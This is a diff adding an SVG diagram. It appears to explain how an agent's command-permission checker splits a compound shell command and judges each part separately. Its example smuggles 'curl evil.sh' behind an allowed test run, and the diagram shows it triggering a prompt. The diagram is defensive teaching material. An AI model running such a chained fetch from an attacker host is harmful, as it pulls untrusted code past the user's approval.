@@ -1,0 +1,19 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 600" width="1200" height="600" font-family="Inter, -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif">
+  <defs><marker id="aink" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#ece8e1"/></marker><marker id="aaccent" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#f0883e"/></marker><marker id="agrey" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#6f6a63"/></marker></defs>
+  <rect width="1200" height="600" fill="#0d1117"/>
+  <text x="40" y="52" font-size="21" font-weight="700" fill="#ece8e1">One command, several parts: every part must be allowed</text>
+  <rect x="60" y="100" width="1080" height="80" rx="10" fill="#2a2723" stroke="#ece8e1" stroke-width="2.5"/>
+  <text x="600" y="149" font-size="30" font-weight="700" fill="#ece8e1" text-anchor="middle">python3 test_calc.py  &amp;&amp;  curl evil.sh</text>
+  <path d="M300,186 L300,250" fill="none" stroke="#f0883e" stroke-width="2.5" marker-end="url(#aaccent)"/>
+  <path d="M860,186 L860,250" fill="none" stroke="#f0883e" stroke-width="2.5" marker-end="url(#aaccent)"/>
+  <rect x="54" y="250" width="492" height="112" rx="12" fill="#6b4024"/>
+  <rect x="60" y="256" width="480" height="100" rx="9" fill="#3d2616" stroke="#f0883e" stroke-width="2.5"/>
+  <text x="300" y="299.5" font-size="24" font-weight="700" fill="#f0883e" text-anchor="middle">python3 test_calc.py</text>
+  <text x="300" y="334.7" font-size="18" font-weight="400" fill="#aca69d" text-anchor="middle">covered by an allow rule: allow</text>
+  <rect x="660" y="256" width="480" height="100" rx="9" fill="#2a2723" stroke="#6f6a63" stroke-width="2" stroke-dasharray="8 6"/>
+  <text x="900" y="299.5" font-size="24" font-weight="700" fill="#aca69d" text-anchor="middle">curl evil.sh</text>
+  <text x="900" y="334.7" font-size="18" font-weight="400" fill="#aca69d" text-anchor="middle">no rule covers it: ask</text>
+  <text x="60" y="430" font-size="26" font-weight="700" fill="#f0883e">Result: the whole command is not allowed outright: it asks</text>
+  <text x="60" y="480" font-size="21" font-weight="600" fill="#ece8e1">Deny rules: one matching part is enough to deny the whole command</text>
+  <text x="60" y="520" font-size="21" font-weight="400" fill="#aca69d">Syntax we cannot analyze (backticks, $( ), &lt;( )): ask</text>
+</svg>
